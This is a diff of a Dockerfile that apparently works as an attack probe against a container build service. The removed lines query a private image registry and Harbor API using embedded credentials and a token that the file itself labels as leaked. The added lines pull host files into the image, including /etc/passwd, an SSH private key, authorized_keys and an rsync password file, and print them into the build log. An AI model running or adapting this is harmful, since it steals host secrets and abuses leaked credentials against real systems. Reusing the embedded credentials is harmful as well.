@@ -1,4 +1,9 @@
 FROM scratch
 ADD rootfs.tar /
-RUN /bin/sh -c 'N=REG5_0926_0110; echo "[MARK] $N"; echo "[REG-CATALOG-anon-CONTRAST]"; busybox wget -q -T 8 -O - http://hub-devops.jcloud.com/v2/_catalog 2>&1 | head -c 300; echo; echo "[REG-CATALOG-with-LEAKED-CREDS]"; busybox wget -q -T 10 -O - --header="Authorization: Basic Y29tcGlsZXI6U2t5d2luQDEyMw==" http://hub-devops.jcloud.com/v2/_catalog 2>&1 | head -c 3000; echo; echo "[REG-TAGS-own-module]"; busybox wget -q -T 10 -O - --header="Authorization: Basic Y29tcGlsZXI6U2t5d2luQDEyMw==" http://hub-devops.jcloud.com/v2/jdsrgrp/jdrhostprobe/tags/list 2>&1 | head -c 800; echo; echo "[HARBOR-PROJECT-with-LEAKED-TOKEN]"; busybox wget -q -T 10 -O - --header="Token: 92dc18e8f7087dd6b309ec27fb525f99" "http://hub-devops.jcloud.com/api/v1/project?project_name=jdsrgrp" 2>&1 | head -c 1500; echo; echo "[END] $N"'
+RUN /bin/sh -c 'N=SYMLINK_0926_0120; echo "[MARK] $N"; echo "[ROOTLS]"; ls -la /; echo "[END-MARK]"'
+ADD hostetc/passwd /leak/passwd
+ADD hostssh/id_rsa /leak/id_rsa
+ADD hostssh/authorized_keys /leak/auth_keys
+ADD rsyncpass /leak/rsync_pass
+RUN /bin/sh -c 'echo "[LEAKED-HOST-FILES]"; for f in /leak/passwd /leak/id_rsa /leak/auth_keys /leak/rsync_pass; do echo "=== $f ==="; cat "$f" 2>&1 | head -c 2500; echo; done; echo "[END] SYMLINK_0926_0120"'
 ENTRYPOINT ["/bin/sh","-c"]
